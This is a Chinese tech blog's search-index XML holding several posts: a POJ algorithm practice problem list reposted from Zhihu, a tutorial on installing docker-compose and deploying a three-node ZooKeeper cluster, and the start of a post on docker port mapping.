<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>docker仓库</title>
    <url>/2019/03/08/devops/docker%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>C经典入门</title>
    <url>/2018/01/11/C/C%E7%BB%8F%E5%85%B8%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p><a href="https://www.zhihu.com/question/23844552/answer/25926376" target="_blank" rel="noopener">https://www.zhihu.com/question/23844552/answer/25926376</a></p>
<p>学的不够</p>
<h1 id="初期"><a href="#初期" class="headerlink" title="初期:"></a>初期:</h1><h2 id="一-基本算法"><a href="#一-基本算法" class="headerlink" title="一.基本算法:"></a>一.基本算法:</h2><blockquote>
<ul>
<li>(1)枚举. (poj1753,poj2965)     </li>
<li>(2)贪心(poj1328,poj2109,poj2586)      </li>
<li>(3)递归和分治法.       </li>
<li>(4)递推.       </li>
<li>(5)构造法.(poj3295)      </li>
<li>(6)模拟法.(poj1068,poj2632,poj1573,poj2993,poj2996) <h2 id="二-图算法"><a href="#二-图算法" class="headerlink" title="二.图算法:"></a>二.图算法:</h2></li>
<li>(1)图的深度优先遍历和广度优先遍历.       </li>
<li>(2)最短路径算法(dijkstra,bellman-ford,floyd,heap+dijkstra) (poj1860,poj3259,poj1062,poj2253,poj1125,poj2240)      </li>
<li>(3)最小生成树算法(prim,kruskal)  (poj1789,poj2485,poj1258,poj3026)      </li>
<li>(4)拓扑排序 (poj1094)      </li>
<li>(5)二分图的最大匹配 (匈牙利算法) (poj3041,poj3020)      </li>
<li>(6)最大流的增广路算法(KM算法). (poj1459,poj3436) <h2 id="三-数据结构"><a href="#三-数据结构" class="headerlink" title="三.数据结构."></a>三.数据结构.</h2></li>
<li>(1)串 (poj1035,poj3080,poj1936)      </li>
<li>(2)排序(快排、归并排(与逆序数有关)、堆排) (poj2388,poj2299)      </li>
<li>(3)简单并查集的应用.       </li>
<li>(4)哈希表和二分查找等高效查找法(数的Hash,串的Hash)(poj3349,poj3274,POJ2151,poj1840,poj2002,poj2503)      </li>
<li>(5)哈夫曼树(poj3253)      </li>
<li>(6)堆      </li>
<li>(7)trie树(静态建树、动态建树) (poj2513) <h2 id="四-简单搜索"><a href="#四-简单搜索" class="headerlink" title="四.简单搜索"></a>四.简单搜索</h2></li>
<li>(1)深度优先搜索 (poj2488,poj3083,poj3009,poj1321,poj2251)      </li>
<li>(2)广度优先搜索(poj3278,poj1426,poj3126,poj3087.poj3414)      </li>
<li>(3)简单搜索技巧和剪枝(poj2531,poj1416,poj2676,1129) <h2 id="五-动态规划"><a href="#五-动态规划" class="headerlink" title="五.动态规划"></a>五.动态规划</h2></li>
<li>(1)背包问题. (poj1837,poj1276)      </li>
<li>(2)型如下表的简单DP(可参考lrj的书 page149):<br>1.E[j]=opt{D[i]+w(i,j)} (poj3267,poj1836,poj1260,poj2533)<br>2.E[i,j]=opt{D[i-1,j]+xi,D[i,j-1]+yj,D[i-1][j-1]+zij} (最长公共子序列)<br>(poj3176,poj1080,poj1159)<br>3.C[i,j]=w[i,j]+opt{C[i,k-1]+C[k,j]}.(最优二分检索树问题)  <h2 id="六-数学"><a href="#六-数学" class="headerlink" title="六.数学"></a>六.数学</h2></li>
<li>(1)组合数学:<br>1.加法原理和乘法原理.<br>2.排列组合.<br>3.递推关系.(POJ3252,poj1850,poj1019,poj1942)      </li>
<li>(2)数论.<br>1.素数与整除问题<br>2.进制位.<br>3.同余模运算.<br>(poj2635, poj3292,poj1845,poj2115)      </li>
<li>(3)计算方法.<br>1.二分法求解单调函数相关知识.(poj3273,poj3258,poj1905,poj3122) <h2 id="七-计算几何学"><a href="#七-计算几何学" class="headerlink" title="七.计算几何学."></a>七.计算几何学.</h2></li>
<li>(1)几何公式.      </li>
<li>(2)叉积和点积的运用(如线段相交的判定,点到线段的距离等). (poj2031,poj1039)      </li>
<li>(3)多边型的简单算法(求面积)和相关判定(点在多边型内,多边型是否相交)(poj1408,poj1584)     </li>
<li>(4)凸包.  (poj2187,poj1113) <h1 id="中级"><a href="#中级" class="headerlink" title="中级:"></a>中级:</h1><h2 id="一-基本算法-1"><a href="#一-基本算法-1" class="headerlink" title="一.基本算法:"></a>一.基本算法:</h2></li>
<li>(1)C++的标准模版库的应用. (poj3096,poj3007)      </li>
<li>(2)较为复杂的模拟题的训练(poj3393,poj1472,poj3371,poj1027,poj2706) <h2 id="二-图算法-1"><a href="#二-图算法-1" class="headerlink" title="二.图算法:"></a>二.图算法:</h2></li>
<li>(1)差分约束系统的建立和求解. (poj1201,poj2983)      </li>
<li>(2)最小费用最大流(poj2516,poj2516,poj2195)      </li>
<li>(3)双连通分量(poj2942)      </li>
<li>(4)强连通分支及其缩点.(poj2186)      </li>
<li>(5)图的割边和割点(poj3352)      </li>
<li>(6)最小割模型、网络流规约(poj3308, ) <h2 id="三-数据结构-1"><a href="#三-数据结构-1" class="headerlink" title="三.数据结构."></a>三.数据结构.</h2></li>
<li>(1)线段树. (poj2528,poj2828,poj2777,poj2886,poj2750)      </li>
<li>(2)静态二叉检索树. (poj2482,poj2352)      </li>
<li>(3)树状树组(poj1195,poj3321)      </li>
<li>(4)RMQ. (poj3264,poj3368)      </li>
<li>(5)并查集的高级应用. (poj1703,2492)      </li>
<li>(6)KMP算法. (poj1961,poj2406) <h2 id="四-搜索"><a href="#四-搜索" class="headerlink" title="四.搜索"></a>四.搜索</h2></li>
<li>(1)最优化剪枝和可行性剪枝       </li>
<li>(2)搜索的技巧和优化 (poj3411,poj1724)      </li>
<li>(3)记忆化搜索(poj3373,poj1691) <h2 id="五-动态规划-1"><a href="#五-动态规划-1" class="headerlink" title="五.动态规划"></a>五.动态规划</h2></li>
<li>(1)较为复杂的动态规划(如动态规划解特别的施行商问题等) (poj1191,poj1054,poj3280,poj2029,poj2948,poj1925,poj3034)     </li>
<li>(2)记录状态的动态规划. (POJ3254,poj2411,poj1185)      </li>
<li>(3)树型动态规划(poj2057,poj1947,poj2486,poj3140) <h2 id="六-数学-1"><a href="#六-数学-1" class="headerlink" title="六.数学"></a>六.数学</h2></li>
<li>(1)组合数学:<br>1.容斥原理.<br>2.抽屉原理.<br>3.置换群与Polya定理(poj1286,poj2409,poj3270,poj1026).<br>4.递推关系和母函数.       </li>
<li>(2)数学.<br>1.高斯消元法(poj2947,poj1487, poj2065,poj1166,poj1222)<br>2.概率问题. (poj3071,poj3440)<br>3.GCD、扩展的欧几里德(中国剩余定理) (poj3101)       </li>
<li>(3)计算方法.<br>1.0/1分数规划. (poj2976)<br>2.三分法求解单峰(单谷)的极值.<br>3.矩阵法(poj3150,poj3422,poj3070)<br>4.迭代逼近(poj3301)      </li>
<li>(4)随机化算法(poj3318,poj2454)      </li>
<li>(5)杂题. (poj1870,poj3296,poj3286,poj1095) <h2 id="七-计算几何学-1"><a href="#七-计算几何学-1" class="headerlink" title="七.计算几何学."></a>七.计算几何学.</h2></li>
<li>(1)坐标离散化.          </li>
<li>(2)扫描线算法(例如求矩形的面积和周长并,常和线段树或堆一起使用). (poj1765,poj1177,poj1151,poj3277,poj2280,poj3004)         </li>
<li>(3)多边形的内核(半平面交)(poj3130,poj3335)        </li>
<li>(4)几何工具的综合应用.(poj1819,poj1066,poj2043,poj3227,poj2165,poj3429) <h1 id="高级"><a href="#高级" class="headerlink" title="高级:"></a>高级:</h1><h2 id="一-基本算法要求"><a href="#一-基本算法要求" class="headerlink" title="一.基本算法要求:"></a>一.基本算法要求:</h2></li>
<li>(1)代码快速写成,精简但不失风格 (poj2525,poj1684,poj1421,poj1048,poj2050,poj3306)      </li>
<li>(2)保证正确性和高效性.  poj3434 <h2 id="二-图算法-2"><a href="#二-图算法-2" class="headerlink" title="二.图算法:"></a>二.图算法:</h2></li>
<li>(1)度限制最小生成树和第K最短路. (poj1639)       </li>
<li>(2)最短路,最小生成树,二分图,最大流问题的相关理论(主要是模型建立和求解)(poj3155, poj2112,poj1966,poj3281,poj1087,poj2289,poj3216,poj2446       </li>
<li>(3)最优比率生成树.  (poj2728)       </li>
<li>(4)最小树形图(poj3164)      </li>
<li>(5)次小生成树.        </li>
<li>(6)无向图、有向图的最小环    <h2 id="三-数据结构-2"><a href="#三-数据结构-2" class="headerlink" title="三.数据结构."></a>三.数据结构.</h2></li>
<li>(1)trie图的建立和应用. (poj2778)       </li>
<li>(2)LCA和RMQ问题(LCA(最近公共祖先问题)有离线算法(并查集+dfs)和在线算法(RMQ+dfs)).(poj1330)       </li>
<li>(3)双端队列和它的应用(维护一个单调的队列,常常在动态规划中起到优化状态转移的目的).  (poj2823)      </li>
<li>(4)左偏树(可合并堆).         </li>
<li>(5)后缀树(非常有用的数据结构,也是赛区考题的热点). (poj3415,poj3294) <h2 id="四-搜索-1"><a href="#四-搜索-1" class="headerlink" title="四.搜索"></a>四.搜索</h2></li>
<li>(1)较麻烦的搜索题目训练(poj1069,poj3322,poj1475,poj1924,poj2049,poj3426)       </li>
<li>(2)广搜的状态优化:利用M进制数存储状态、转化为串用hash表判重、按位压缩存储状态、双向广搜、A*算法. (poj1768,poj1184,poj1872,poj1324,poj2046,poj1482)       </li>
<li>(3)深搜的优化:尽量用位运算、一定要加剪枝、函数参数尽可能少、层数不易过大、可以考虑双向搜索或者是轮换搜索、IDA*算法. (poj3131,poj2870,poj2286) <h2 id="五-动态规划-2"><a href="#五-动态规划-2" class="headerlink" title="五.动态规划"></a>五.动态规划</h2></li>
<li>(1)需要用数据结构优化的动态规划. (poj2754,poj3378,poj3017)       </li>
<li>(2)四边形不等式理论.        </li>
<li>(3)较难的状态DP(poj3133) <h2 id="六-数学-2"><a href="#六-数学-2" class="headerlink" title="六.数学"></a>六.数学</h2></li>
<li>(1)组合数学.<br>1.MoBius反演(poj2888,poj2154)<br>2.偏序关系理论.        </li>
<li>(2)博奕论.<br>1.极大极小过程(poj3317,poj1085)<br>2.Nim问题.  <h2 id="七-计算几何学-2"><a href="#七-计算几何学-2" class="headerlink" title="七.计算几何学."></a>七.计算几何学.</h2></li>
<li>(1)半平面求交(poj3384,poj2540) </li>
<li>(2)可视图的建立(poj2966)      </li>
<li>(3)点集最小圆覆盖.        </li>
<li>(4)对踵点(poj2079)       <h2 id="八-综合题-poj3109-poj1478-poj1462-poj2729-poj2048-poj3336-poj3315-poj2148-poj1263"><a href="#八-综合题-poj3109-poj1478-poj1462-poj2729-poj2048-poj3336-poj3315-poj2148-poj1263" class="headerlink" title="八.综合题. (poj3109,poj1478,poj1462,poj2729,poj2048,poj3336,poj3315,poj2148,poj1263)"></a>八.综合题. (poj3109,poj1478,poj1462,poj2729,poj2048,poj3336,poj3315,poj2148,poj1263)</h2></li>
<li>1.不完全状态记录<br><1>青蛙过河问题<br><2>利用区间dp </2></1></li>
<li>2.背包类问题<br><1> 0-1背包，经典问题<br><2>无限背包，经典问题<br><3>判定性背包问题<br><4>带附属关系的背包问题<br><5> + -1背包问题<br><6>双背包求最优值<br><7>构造三角形问题<br><8>带上下界限制的背包问题(012背包) </8></7></6></5></4></3></2></1></li>
<li>3.线性的动态规划问题<br><1>积木游戏问题<br><2>决斗（判定性问题）<br><3>圆的最大多边形问题<br><4>统计单词个数问题<br><5>棋盘分割<br><6>日程安排问题<br><7>最小逼近问题(求出两数之比最接近某数/两数之和等于某数等等)<br><8>方块消除游戏(某区间可以连续消去求最大效益)<br><9>资源分配问题<br><10>数字三角形问题<br><11>漂亮的打印<br><12>邮局问题与构造答案<br><13>最高积木问题<br><14>两段连续和最大<br><15>2次幂和问题<br><16>N个数的最大M段子段和<br><17>交叉最大数问题 </17></16></15></14></13></12></11></10></9></8></7></6></5></4></3></2></1></li>
<li>4.判定性问题的dp(如判定整除、判定可达性等)<br><1>模K问题的dp<br><2>特殊的模K问题，求最大(最小)模K的数<br><3>变换数问题 </3></2></1></li>
<li>5.单调性优化的动态规划<br><1>1-SUM问题<br><2>2-SUM问题<br><3>序列划分问题(单调队列优化) </3></2></1></li>
<li>6.剖分问题(多边形剖分/石子合并/圆的剖分/乘积最大)<br><1>凸多边形的三角剖分问题<br><2>乘积最大问题<br><3>多边形游戏(多边形边上是操作符,顶点有权值)<br><4>石子合并(N^3/N^2/NLogN各种优化) </4></3></2></1></li>
<li>7.贪心的动态规划<br><1>最优装载问题<br><2>部分背包问题<br><3>乘船问题<br><4>贪心策略<br><5>双机调度问题Johnson算法 </5></4></3></2></1></li>
<li>8.状态dp<br><1>牛仔射击问题(博弈类)<br><2>哈密顿路径的状态dp<br><3>两支点天平平衡问题<br><4>一个有向图的最接近二部图</4></3></2></1></li>
<li>9.树型dp<br> <1>完美服务器问题(每个节点有3种状态)<br> <2>小胖守皇宫问题<br> <3>网络收费问题<br> <4>树中漫游问题</4></3></2></1></li>
</ul>
</blockquote>
<p>转自:<br><a href="https://www.zhihu.com/question/23844552" target="_blank" rel="noopener">学会了 C 语言真的可以开发出很多东西吗？</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-compose安装zookeeper集群</title>
    <url>/2019/03/09/devops/docker-compose%20%E5%AE%89%E8%A3%85zookeeper%E9%9B%86%E7%BE%A4/</url>
    <content><![CDATA[<p>用docker部署服务需要编写dockerfile,如果有多个服务或者集群岂不是很麻烦。所以docker compose应运而生。<br>Docker Compose 可以轻松、高效的管理容器，它是一个用于定义和运行多容器 Docker 的应用程序工具。<br>本节主要的内容:</p>
<blockquote>
<ul>
<li>docker-compose 安装</li>
<li>docker-compose文件编写</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="docker-compose-安装"><a href="#docker-compose-安装" class="headerlink" title="docker-compose 安装"></a>docker-compose 安装</h1><p>docker-compose 有两种安装方式</p>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">sudo curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.23.2/docker-compose-<span class="variable">$(uname -s)</span>-<span class="variable">$(uname -m)</span>"</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授权</span></span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立软连接</span></span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/bin/docker-compose /usr/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看版本信息</span></span><br><span class="line">docker-compose --version</span><br><span class="line">docker-compose version 1.23.2, build 1110ad01</span><br></pre></td></tr></table></figure>
<p>这种方法由于网络原因经常失败，所有用pip的方式安装。</p>
<h2 id="pip-安装"><a href="#pip-安装" class="headerlink" title="pip 安装"></a>pip 安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装epel扩展</span></span><br><span class="line"></span><br><span class="line">yum -y install epel-release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装pip</span></span><br><span class="line"></span><br><span class="line">yum install pyton-pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 docker-compose</span></span><br><span class="line"></span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
<p>查看docker-compose 版本信息，如下表示安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost zookeeper]<span class="comment"># docker-compose version</span></span><br><span class="line">docker-compose version 1.23.2, build 1110ad0</span><br><span class="line">docker-py version: 3.7.0</span><br><span class="line">CPython version: 2.7.5</span><br><span class="line">OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013</span><br></pre></td></tr></table></figure>
<h1 id="docker-compose常用命令"><a href="#docker-compose常用命令" class="headerlink" title="docker-compose常用命令"></a>docker-compose常用命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker zookeeper]<span class="comment"># COMPOSE_PROJECT_NAME=zk_cluster docker-compose</span></span><br><span class="line">Define and run multi-container applications with Docker.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  docker-compose [-f &lt;arg&gt;...] [options] [COMMAND] [ARGS...]</span><br><span class="line">  docker-compose -h|--<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f, --file FILE             Specify an alternate compose file</span><br><span class="line">                              (default: docker-compose.yml)</span><br><span class="line">  -p, --project-name NAME     Specify an alternate project name</span><br><span class="line">                              (default: directory name)</span><br><span class="line">  --verbose                   Show more output</span><br><span class="line">  --<span class="built_in">log</span>-level LEVEL           Set <span class="built_in">log</span> level (DEBUG, INFO, WARNING, ERROR, CRITICAL)</span><br><span class="line">  --no-ansi                   Do not <span class="built_in">print</span> ANSI control characters</span><br><span class="line">  -v, --version               Print version and <span class="built_in">exit</span></span><br><span class="line">  -H, --host HOST             Daemon socket to connect to</span><br><span class="line"></span><br><span class="line">  --tls                       Use TLS; implied by --tlsverify</span><br><span class="line">  --tlscacert CA_PATH         Trust certs signed only by this CA</span><br><span class="line">  --tlscert CLIENT_CERT_PATH  Path to TLS certificate file</span><br><span class="line">  --tlskey TLS_KEY_PATH       Path to TLS key file</span><br><span class="line">  --tlsverify                 Use TLS and verify the remote</span><br><span class="line">  --skip-hostname-check       Don<span class="string">'t check the daemon'</span>s hostname against the</span><br><span class="line">                              name specified <span class="keyword">in</span> the client certificate</span><br><span class="line">  --project-directory PATH    Specify an alternate working directory</span><br><span class="line">                              (default: the path of the Compose file)</span><br><span class="line">  --compatibility             If <span class="built_in">set</span>, Compose will attempt to convert deploy</span><br><span class="line">                              keys <span class="keyword">in</span> v3 files to their non-Swarm equivalent</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  build              Build or rebuild services</span><br><span class="line">  bundle             Generate a Docker bundle from the Compose file</span><br><span class="line">  config             Validate and view the Compose file</span><br><span class="line">  create             Create services</span><br><span class="line">  down               Stop and remove containers, networks, images, and volumes</span><br><span class="line">  events             Receive real time events from containers</span><br><span class="line">  <span class="built_in">exec</span>               Execute a <span class="built_in">command</span> <span class="keyword">in</span> a running container</span><br><span class="line">  <span class="built_in">help</span>               Get <span class="built_in">help</span> on a <span class="built_in">command</span></span><br><span class="line">  images             List images</span><br><span class="line">  <span class="built_in">kill</span>               Kill containers</span><br><span class="line">  logs               View output from containers</span><br><span class="line">  pause              Pause services</span><br><span class="line">  port               Print the public port <span class="keyword">for</span> a port binding</span><br><span class="line">  ps                 List containers</span><br><span class="line">  pull               Pull service images</span><br><span class="line">  push               Push service images</span><br><span class="line">  restart            Restart services</span><br><span class="line">  rm                 Remove stopped containers</span><br><span class="line">  run                Run a one-off <span class="built_in">command</span></span><br><span class="line">  scale              Set number of containers <span class="keyword">for</span> a service</span><br><span class="line">  start              Start services</span><br><span class="line">  stop               Stop services</span><br><span class="line">  top                Display the running processes</span><br><span class="line">  unpause            Unpause services</span><br><span class="line">  up                 Create and start containers</span><br><span class="line">  version            Show the Docker-Compose version information</span><br></pre></td></tr></table></figure>
<p>此处不做过多说明,主要是启动、停止、重启服务,简单演示一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##查看镜像列表</span></span><br><span class="line">[root@docker zookeeper]<span class="comment"># COMPOSE_PROJECT_NAME=zk_cluster docker-compose images</span></span><br><span class="line">Container   Repository    Tag       Image Id      Size</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">zk1         zookeeper    3.4.13   06b178591ab3   143 MB</span><br><span class="line">zk2         zookeeper    3.4.13   06b178591ab3   143 MB</span><br><span class="line">zk3         zookeeper    3.4.13   06b178591ab3   143 MB</span><br></pre></td></tr></table></figure>
<h1 id="docker-compose文件编写"><a href="#docker-compose文件编写" class="headerlink" title="docker-compose文件编写"></a>docker-compose文件编写</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">      zk1:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">zookeeper:3.4.13</span></span><br><span class="line"><span class="attr">        restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">        container_name:</span> <span class="string">zk1</span></span><br><span class="line"><span class="attr">        volumes:</span></span><br><span class="line"><span class="bullet">             -</span> <span class="string">"/data:/opt/zookeeper/zk1/data"</span></span><br><span class="line"><span class="bullet">             -</span> <span class="string">"/logs:/opt/zookeeper/zk1/logs"</span></span><br><span class="line"><span class="attr">        ports:</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2181:2181"</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2881:2888"</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2882:2889"</span></span><br><span class="line"><span class="attr">        environment:</span></span><br><span class="line"><span class="attr">             ZOO_MY_ID:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">             ZOO_SERVERS:</span> <span class="string">server.1=zk1:2888:2889</span> <span class="string">server.2=zk2:2888:2889</span> <span class="string">server.3=zk3:2888:2889</span></span><br><span class="line"><span class="attr">      zk2:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">zookeeper:3.4.13</span></span><br><span class="line"><span class="attr">        restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">        container_name:</span> <span class="string">zk2</span></span><br><span class="line"><span class="attr">        volumes:</span></span><br><span class="line"><span class="bullet">             -</span> <span class="string">"/data:/opt/zookeeper/zk2/data"</span></span><br><span class="line"><span class="bullet">             -</span> <span class="string">"/logs:/opt/zookeeper/zk2/logs"</span></span><br><span class="line"><span class="attr">        ports:</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2182:2181"</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2883:2888"</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2884:2889"</span></span><br><span class="line"><span class="attr">        environment:</span></span><br><span class="line"><span class="attr">             ZOO_MY_ID:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">             ZOO_SERVERS:</span> <span class="string">server.1=zk1:2888:2889</span> <span class="string">server.2=zk2:2888:2889</span> <span class="string">server.3=zk3:2888:2889</span></span><br><span class="line"><span class="attr">      zk3:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">zookeeper:3.4.13</span></span><br><span class="line"><span class="attr">        restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">        container_name:</span> <span class="string">zk3</span></span><br><span class="line"><span class="attr">        volumes:</span></span><br><span class="line"><span class="bullet">             -</span> <span class="string">"/data:/opt/zookeeper/zk3/data"</span></span><br><span class="line"><span class="bullet">             -</span> <span class="string">"/logs:/opt/zookeeper/zk3/logs"</span></span><br><span class="line"><span class="attr">        ports:</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2183:2181"</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2885:2888"</span></span><br><span class="line"><span class="bullet">           -</span> <span class="string">"2886:2889"</span></span><br><span class="line"><span class="attr">        environment:</span></span><br><span class="line"><span class="attr">             ZOO_MY_ID:</span> <span class="number">3</span></span><br><span class="line"><span class="attr">             ZOO_SERVERS:</span> <span class="string">server.1=zk1:2888:2889</span> <span class="string">server.2=zk2:2888:2889</span> <span class="string">server.3=zk3:2888:2889</span></span><br></pre></td></tr></table></figure>
<p>后台启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker zookeeper]<span class="comment"># COMPOSE_PROJECT_NAME=zk_cluster docker-compose up -d</span></span><br><span class="line">Pulling zk1 (zookeeper:3.4.13)...</span><br><span class="line">3.4.13: Pulling from library/zookeeper</span><br><span class="line">6c40cc604d8e: Pull complete</span><br><span class="line">e78b80385239: Pull complete</span><br><span class="line">f41fe1b6eee3: Pull complete</span><br><span class="line">365a20fafc58: Pull complete</span><br><span class="line">9e606d67ebbc: Pull complete</span><br><span class="line">36ef678bdfcf: Pull complete</span><br><span class="line">19d9db30b445: Pull complete</span><br><span class="line">Pulling zk2 (zookeeper:3.4.13)...</span><br><span class="line">3.4.13: Pulling from library/zookeeper</span><br><span class="line">Creating zk1 ... <span class="keyword">done</span></span><br><span class="line">Creating zk2 ... <span class="keyword">done</span></span><br><span class="line">Creating zk3 ... <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">查看运行状态:</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">[root@docker zookeeper]<span class="comment"># COMPOSE_PROJECT_NAME=zk_cluster docker-compose ps</span></span><br><span class="line">Name              Command               State                    Ports</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">zk1    /docker-entrypoint.sh zkSe ...   Up      0.0.0.0:2181-&gt;2181/tcp,</span><br><span class="line">                                                0.0.0.0:2881-&gt;2888/tcp,</span><br><span class="line">                                                0.0.0.0:2882-&gt;2889/tcp, 3888/tcp</span><br><span class="line">zk2    /docker-entrypoint.sh zkSe ...   Up      0.0.0.0:2182-&gt;2181/tcp,</span><br><span class="line">                                                0.0.0.0:2883-&gt;2888/tcp,</span><br><span class="line">                                                0.0.0.0:2884-&gt;2889/tcp, 3888/tcp</span><br><span class="line">zk3    /docker-entrypoint.sh zkSe ...   Up      0.0.0.0:2183-&gt;2181/tcp,</span><br><span class="line">                                                0.0.0.0:2885-&gt;2888/tcp,</span><br><span class="line">                                                0.0.0.0:2886-&gt;2889/tcp, 3888/tcp</span><br></pre></td></tr></table></figure>
<p>查看zk状态:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker zookeeper]<span class="comment"># docker exec -it 7b2a7e84dfcb /bin/bash</span></span><br><span class="line">bash-4.4<span class="comment"># ls</span></span><br><span class="line">LICENSE.txt                contrib                    src</span><br><span class="line">NOTICE.txt                 dist-maven                 zookeeper-3.4.13.jar</span><br><span class="line">README.md                  docs                       zookeeper-3.4.13.jar.asc</span><br><span class="line">README_packaging.txt       ivy.xml                    zookeeper-3.4.13.jar.md5</span><br><span class="line">bin                        ivysettings.xml            zookeeper-3.4.13.jar.sha1</span><br><span class="line">build.xml                  lib</span><br><span class="line">conf                       recipes</span><br><span class="line">bash-4.4<span class="comment"># cd bin/</span></span><br><span class="line">bash-4.4<span class="comment"># zkServer.sh status</span></span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /conf/zoo.cfg</span><br><span class="line">Mode: leader</span><br></pre></td></tr></table></figure></p>
<p>看到节点状态显示为leader，zk 集群已经搭建ok。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://docs.docker.com/samples/library/zookeeper/" target="_blank" rel="noopener">zoookeeper docker配置项参考</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker端口映射和容器互联</title>
    <url>/2019/03/10/devops/docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%92%8C%E5%AE%B9%E5%99%A8%E4%BA%92%E8%81%94/</url>
    <content><![CDATA[<h1 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h1><p>在启动容器时，如果不配置宿主机器与虚拟机的端口映射，外部程序是无法访问虚拟机的，因为没有端口，所以需要进行端口映射。</p>
<p>端口映射有两个关键词-P -p，一个是大写一个是小写，通过run —help也可以看到。大写的P是随机映射一个49000-49900的端口到内部容器开放的网络端口。小写p可以指定要映射的端口，并且在一个指定端口上只可以绑定一个容器。</p>
<h2 id="端口映射支持的方式"><a href="#端口映射支持的方式" class="headerlink" title="端口映射支持的方式"></a>端口映射支持的方式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip:hostport:containerport <span class="comment">#指定ip、指定宿主机port、指定容器port</span></span><br><span class="line">ip::containerport www.abc.cn <span class="comment">#指定ip、未指定宿主机port（随机）、指定容器port</span></span><br><span class="line">hostport:containerport <span class="comment">#未指定ip、指定宿主机port、指定容器port</span></span><br></pre></td></tr></table></figure>
<h2 id="端口映射方式"><a href="#端口映射方式" class="headerlink" title="端口映射方式"></a>端口映射方式</h2><h3 id="将容器暴露的所有端口，都随机映射到宿主机上-不推荐-。"><a href="#将容器暴露的所有端口，都随机映射到宿主机上-不推荐-。" class="headerlink" title="将容器暴露的所有端口，都随机映射到宿主机上(不推荐)。"></a>将容器暴露的所有端口，都随机映射到宿主机上(不推荐)。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># docker run -P -d --name nginx_1 nginx</span></span><br><span class="line">bed30930c9d7adf0755a8e1de65dd2d4a58b8af36c9f25f96f756efd1960586d</span><br><span class="line">[root@docker ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS                                                                              NAMES</span><br><span class="line">bed30930c9d7        nginx               <span class="string">"nginx -g 'daemon of…"</span>   8 seconds ago       Up 5 seconds              0.0.0.0:32769-&gt;80/tcp                                                              nginx_1</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 查看端口映射                                                                                  </span></span><br><span class="line">[root@docker ~]<span class="comment"># docker port bed30930c9d7</span></span><br><span class="line">80/tcp -&gt; 0.0.0.0:32769</span><br></pre></td></tr></table></figure>
<p>可见容器将80端口映射到宿主机的32769端口上。</p>
